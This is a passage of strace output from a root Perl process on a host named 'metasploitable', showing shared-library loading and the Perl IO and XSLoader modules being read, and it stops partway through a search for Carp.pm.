12010 20:22:35.185239 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12010 20:22:35.185256 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f52000
12010 20:22:35.185272 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
12010 20:22:35.185291 open("/etc/ld.so.cache", O_RDONLY) = 1
12010 20:22:35.185304 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
12010 20:22:35.185323 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f4a000
12010 20:22:35.185333 close(1)          = 0
12010 20:22:35.185344 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12010 20:22:35.185410 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
12010 20:22:35.185426 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
12010 20:22:35.185525 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
12010 20:22:35.185544 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f46000
12010 20:22:35.185557 mmap2(0xb7f48000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f48000
12010 20:22:35.185574 close(1)          = 0
12010 20:22:35.185586 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12010 20:22:35.185600 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 1
12010 20:22:35.185614 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
12010 20:22:35.185704 fstat64(1, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
12010 20:22:35.185721 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f21000
12010 20:22:35.185733 mmap2(0xb7f44000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x23) = 0xb7f44000
12010 20:22:35.185749 close(1)          = 0
12010 20:22:35.185761 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12010 20:22:35.185775 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 1
12010 20:22:35.185789 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
12010 20:22:35.185891 fstat64(1, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
12010 20:22:35.185909 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f20000
12010 20:22:35.185923 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f08000
12010 20:22:35.185934 mmap2(0xb7f1c000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7f1c000
12010 20:22:35.185949 mmap2(0xb7f1e000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f1e000
12010 20:22:35.185963 close(1)          = 0
12010 20:22:35.185975 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12010 20:22:35.185989 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
12010 20:22:35.186004 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
12010 20:22:35.186094 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
12010 20:22:35.186112 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7db9000
12010 20:22:35.186124 mmap2(0xb7f02000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f02000
12010 20:22:35.186139 mmap2(0xb7f05000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f05000
12010 20:22:35.186153 close(1)          = 0
12010 20:22:35.186165 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12010 20:22:35.186179 open("/lib/tls/i686/cmov/libcrypt.so.1", O_RDONLY) = 1
12010 20:22:35.186194 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\7\0\0004\0\0\0<\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340\210\0\0\340\210\0\0\340\210\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\f\212\0\0\f\212\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0`\1\0\0tr\2\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\17\0\0\0\22\0\0\0\2\0\0\0\6\0\0\0\4\311\240, \4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\23\0\0\0\24\0\0\0\0\0\0\0\25\0\0\0\26\0\0\0\0\0\0\0\27\0\0\0\0\0\0\0\30\0\0\0\31\0\0\0\0\0\0\0k\31Qj\233(\375B\233`\205\33\327\16?\17I->\333\235C\r\375\313\373_\22\325=l\366\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0o\0\0\0\0\0\0\0\35\0\0\0\22\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\37\0\0\0\0\0\0\0", 512) = 512
12010 20:22:35.186283 fstat64(1, {st_mode=S_IFREG|0644, st_size=38300, ...}) = 0
12010 20:22:35.186301 mmap2(NULL, 201052, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d87000
12010 20:22:35.186312 mmap2(0xb7d90000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7d90000
12010 20:22:35.186330 mmap2(0xb7d92000, 155996, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7d92000
12010 20:22:35.186352 close(1)          = 0
12010 20:22:35.186376 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d86000
12010 20:22:35.186391 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d868c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
12010 20:22:35.186452 mprotect(0xb7f02000, 4096, PROT_READ) = 0
12010 20:22:35.186478 munmap(0xb7f4a000, 29913) = 0
12010 20:22:35.186492 set_tid_address(0xb7d86908) = 12010
12010 20:22:35.186501 set_robust_list(0xb7d86910, 0xc) = 0
12010 20:22:35.186511 futex(0xbfc7a910, 0x81 /* FUTEX_??? */, 1) = 0
12010 20:22:35.186525 rt_sigaction(SIGRTMIN, {0xb7f0c2c0, [], SA_SIGINFO}, NULL, 8) = 0
12010 20:22:35.186538 rt_sigaction(SIGRT_1, {0xb7f0c340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
12010 20:22:35.186551 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
12010 20:22:35.186565 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
12010 20:22:35.186584 uname({sys="Linux", node="metasploitable", ...}) = 0
12010 20:22:35.186632 rt_sigaction(SIGFPE, {SIG_IGN}, {SIG_DFL}, 8) = 0
12010 20:22:35.186679 brk(0)            = 0x8153000
12010 20:22:35.186688 brk(0x8174000)    = 0x8174000
12010 20:22:35.186733 getuid32()        = 0
12010 20:22:35.186743 geteuid32()       = 0
12010 20:22:35.186752 getgid32()        = 0
12010 20:22:35.186762 getegid32()       = 0
12010 20:22:35.186799 mmap2(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d65000
12010 20:22:35.186827 open("/dev/urandom", O_RDONLY|O_LARGEFILE) = 1
12010 20:22:35.186854 read(1, "\303]<\346", 4) = 4
12010 20:22:35.186870 close(1)          = 0
12010 20:22:35.186916 time(NULL)        = 1495671755
12010 20:22:35.187046 stat64("/usr/local/lib/site_perl/5.8.8/i486-linux-gnu-thread-multi", 0xbfc7a5e0) = -1 ENOENT (No such file or directory)
12010 20:22:35.187065 stat64("/usr/local/lib/site_perl/5.8.8", 0xbfc7a5e0) = -1 ENOENT (No such file or directory)
12010 20:22:35.187079 stat64("/usr/local/lib/site_perl/i486-linux-gnu-thread-multi", 0xbfc7a5e0) = -1 ENOENT (No such file or directory)
12010 20:22:35.187095 stat64("/usr/local/lib/perl/5.8.7", 0xbfc7a720) = -1 ENOENT (No such file or directory)
12010 20:22:35.187108 stat64("/usr/local/share/perl/5.8.7", 0xbfc7a720) = -1 ENOENT (No such file or directory)
12010 20:22:35.187120 stat64("/usr/local/lib/perl/5.8.6", 0xbfc7a720) = -1 ENOENT (No such file or directory)
12010 20:22:35.187132 stat64("/usr/local/share/perl/5.8.6", 0xbfc7a720) = -1 ENOENT (No such file or directory)
12010 20:22:35.187144 stat64("/usr/local/lib/perl/5.8.4", 0xbfc7a720) = -1 ENOENT (No such file or directory)
12010 20:22:35.187156 stat64("/usr/local/share/perl/5.8.4", 0xbfc7a720) = -1 ENOENT (No such file or directory)
12010 20:22:35.187168 stat64("/usr/local/lib/perl/5.8.3", 0xbfc7a720) = -1 ENOENT (No such file or directory)
12010 20:22:35.187179 stat64("/usr/local/share/perl/5.8.3", 0xbfc7a720) = -1 ENOENT (No such file or directory)
12010 20:22:35.187192 stat64("/usr/local/lib/perl/5.8.2", 0xbfc7a720) = -1 ENOENT (No such file or directory)
12010 20:22:35.187203 stat64("/usr/local/share/perl/5.8.2", 0xbfc7a720) = -1 ENOENT (No such file or directory)
12010 20:22:35.187215 stat64("/usr/local/lib/perl/5.8.1", 0xbfc7a720) = -1 ENOENT (No such file or directory)
12010 20:22:35.187227 stat64("/usr/local/share/perl/5.8.1", 0xbfc7a720) = -1 ENOENT (No such file or directory)
12010 20:22:35.187239 stat64("/usr/local/lib/perl/5.8.0", 0xbfc7a720) = -1 ENOENT (No such file or directory)
12010 20:22:35.187251 stat64("/usr/local/share/perl/5.8.0", 0xbfc7a720) = -1 ENOENT (No such file or directory)
12010 20:22:35.187273 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc7a418) = -1 ENOTTY (Inappropriate ioctl for device)
12010 20:22:35.187288 _llseek(0, 0, [0], SEEK_CUR) = 0
12010 20:22:35.187300 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc7a418) = -1 EBADF (Bad file descriptor)
12010 20:22:35.187316 _llseek(1, 0, 0xbfc7a460, SEEK_CUR) = -1 EBADF (Bad file descriptor)
12010 20:22:35.187327 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc7a418) = -1 EINVAL (Invalid argument)
12010 20:22:35.187338 _llseek(2, 0, 0xbfc7a460, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12010 20:22:35.187380 open("/dev/null", O_RDONLY|O_LARGEFILE) = 1
12010 20:22:35.187410 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc7a4d8) = -1 ENOTTY (Inappropriate ioctl for device)
12010 20:22:35.187421 _llseek(1, 0, [0], SEEK_CUR) = 0
12010 20:22:35.187433 fcntl64(1, F_SETFD, FD_CLOEXEC) = 0
12010 20:22:35.187445 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
12010 20:22:35.187465 rt_sigaction(SIGCHLD, NULL, {SIG_DFL}, 8) = 0
12010 20:22:35.187522 readlink("/proc/self/exe", "/usr/bin/perl", 4095) = 13
12010 20:22:35.187570 getppid()         = 12008
12010 20:22:35.187632 stat64("/etc/perl/IO.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.187646 stat64("/etc/perl/IO.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.187660 stat64("/usr/local/lib/perl/5.8.8/IO.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.187673 stat64("/usr/local/lib/perl/5.8.8/IO.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.187686 stat64("/usr/local/share/perl/5.8.8/IO.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.187699 stat64("/usr/local/share/perl/5.8.8/IO.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.187713 stat64("/usr/lib/perl5/IO.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.187726 stat64("/usr/lib/perl5/IO.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.187739 stat64("/usr/share/perl5/IO.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.187751 stat64("/usr/share/perl5/IO.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.187764 stat64("/usr/lib/perl/5.8/IO.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.187778 stat64("/usr/lib/perl/5.8/IO.pm", {st_mode=S_IFREG|0644, st_size=413, ...}) = 0
12010 20:22:35.187799 open("/usr/lib/perl/5.8/IO.pm", O_RDONLY|O_LARGEFILE) = 6
12010 20:22:35.187834 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc79ee8) = -1 ENOTTY (Inappropriate ioctl for device)
12010 20:22:35.187873 _llseek(6, 0, [0], SEEK_CUR) = 0
12010 20:22:35.187902 read(6, "#\n\npackage IO;\n\nuse XSLoader ();\nuse Carp;\nuse strict;\nuse warnings;\n\nour $VERSION = \"1.22\";\nXSLoader::load \'IO\', $VERSION;\n\nsub import {\n    shift;\n\n    warnings::warnif(\'deprecated\', qq{Parameterless \"use IO\" deprecated})\n        if @_ == 0 ;\n    \n    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);\n\n    eval join(\"\", map { \"require IO::\" . (/(\\w+)/)[0] . \";\\n\" } @l)\n\tor croak $@;\n}\n\n1;\n\n__END__\n\n", 4096) = 413
12010 20:22:35.187998 stat64("/etc/perl/XSLoader.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.188012 stat64("/etc/perl/XSLoader.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.188026 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.188039 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.188053 stat64("/usr/local/share/perl/5.8.8/XSLoader.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.188066 stat64("/usr/local/share/perl/5.8.8/XSLoader.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.188080 stat64("/usr/lib/perl5/XSLoader.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.188092 stat64("/usr/lib/perl5/XSLoader.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.188108 stat64("/usr/share/perl5/XSLoader.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.188121 stat64("/usr/share/perl5/XSLoader.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.188139 stat64("/usr/lib/perl/5.8/XSLoader.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.188152 stat64("/usr/lib/perl/5.8/XSLoader.pm", {st_mode=S_IFREG|0644, st_size=3408, ...}) = 0
12010 20:22:35.188173 open("/usr/lib/perl/5.8/XSLoader.pm", O_RDONLY|O_LARGEFILE) = 8
12010 20:22:35.188188 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc79a38) = -1 ENOTTY (Inappropriate ioctl for device)
12010 20:22:35.188199 _llseek(8, 0, [0], SEEK_CUR) = 0
12010 20:22:35.188218 read(8, "# Generated from XSLoader.pm.PL (resolved %Config::Config value)\n\npackage XSLoader;\n\n$VERSION = \"0.06\";\n\n#use strict;\n\n# enable debug/trace messages from DynaLoader perl code\n# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;\n\n  my $dl_dlext = \'so\';\n\npackage DynaLoader;\n\n# No prizes for guessing why we don\'t say \'bootstrap DynaLoader;\' here.\n# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB\nboot_DynaLoader(\'DynaLoader\') if defined(&boot_DynaLoader) &&\n                                !defined(&dl_error);\npackage XSLoader;\n\nsub load {\n    package DynaLoader;\n\n    die q{XSLoader::load(\'Your::Module\', $Your::Module::VERSION)} unless @_;\n\n    my($module) = $_[0];\n\n    # work with static linking too\n    my $b = \"$module\\::bootstrap\";\n    goto &$b if defined &$b;\n\n    goto retry unless $module and defined &dl_load_file;\n\n    my @modparts = split(/::/,$module);\n    my $modfname = $modparts[-1];\n\n    my $modpname = join(\'/\',@modparts);\n    my $modlibname = (caller())[1];\n    my $c = @modparts;\n    $modlibname =~ s,[\\\\/][^\\\\/]+$,, while $c--;\t# Q&D basename\n    my $file = \"$modlibname/auto/$modpname/$modfname.$dl_dlext\";\n\n#   print STDERR \"XSLoader::load for $module ($file)\\n\" if $dl_debug;\n\n    my $bs = $file;\n    $bs =~ s/(\\.\\w+)?(;\\d*)?$/\\.bs/; # look for .bs \'beside\' the library\n\n    goto retry if not -f $file or -s $bs;\n\n    my $bootname = \"boot_$module\";\n    $bootname =~ s/\\W/_/g;\n    @DynaLoader::dl_require_symbols = ($bootname);\n\n    my $boot_symbol_ref;\n\n    if ($^O eq \'darwin\') {\n        if ($boot_symbol_ref = dl_find_symbol(0, $bootname)) {\n            goto boot; #extension library has already been loaded, e.g. darwin\n        }\n    }\n\n    # Many dynamic extension loading problems will appear to come from\n    # this section of code: XYZ failed at line 123 of DynaLoader.pm.\n    # Often these errors are actually occurring in the initialisation\n    # C code of the extension XS file. Perl reports the error as being\n    # in this perl code simply because this was the last perl code\n    # it executed.\n\n    my $libref = dl_load_file($file, 0) or do { \n        require Carp;\n        Carp::croak(\"Can\'t load \'$file\' for module $module: \" . dl_error());\n    };\n    push(@DynaLoader::dl_librefs,$libref);  # record loaded object\n\n    my @unresolved = dl_undef_symbols();\n    if (@unresolved) {\n        require Carp;\n        Carp::carp(\"Undefined symbols present after loading $file: @unresolved\\n\");\n    }\n\n    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {\n        require Carp;\n        Carp::croak(\"Can\'t find \'$bootname\' symbol in $file\\n\");\n    };\n\n    push(@DynaLoader::dl_modules, $module); # record loaded module\n\n  boot:\n    my $xs = dl_install_xsub(\"${module}::bootstrap\", $boot_symbol_ref, $file);\n\n    # See comment block above\n    return &$xs(@_);\n\n  retry:\n    my $bootstrap_inherit = DynaLoader->can(\'bootstrap_inherit\') || \n                            XSLoader->can(\'bootstrap_inherit\');\n    goto &$bootstrap_inherit;\n}\n\n# Versions of DynaLoader prior to 5.6.0 don\'t have this function.\nsub bootstrap_inherit {\n    package DynaLoader;\n\n    my $module = $_[0];\n    local *DynaLoader::isa = *{\"$module\\::ISA\"};\n    local @DynaLoader::isa = (@DynaLoader::isa, \'DynaLoader\');\n    # Cannot goto due to delocalization.  Will report errors on a wrong line?\n    require DynaLoader;\n    DynaLoader::bootstrap(@_);\n}\n\n1;\n\n__END__\n\n", 4096) = 3408
12010 20:22:35.188544 brk(0x8195000)    = 0x8195000
12010 20:22:35.188855 _llseek(8, 3407, [3407], SEEK_SET) = 0
12010 20:22:35.188872 _llseek(8, 0, [3407], SEEK_CUR) = 0
12010 20:22:35.188883 close(8)          = 0
12010 20:22:35.188941 stat64("/etc/perl/Carp.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.188958 stat64("/etc/perl/Carp.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.188972 stat64("/usr/local/lib/perl/5.8.8/Carp.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.188985 stat64("/usr/local/lib/perl/5.8.8/Carp.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.188999 stat64("/usr/local/share/perl/5.8.8/Carp.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.189012 stat64("/usr/local/share/perl/5.8.8/Carp.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.189026 stat64("/usr/lib/perl5/Carp.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.189038 stat64("/usr/lib/perl5/Carp.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.189052 stat64("/usr/share/perl5/Carp.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
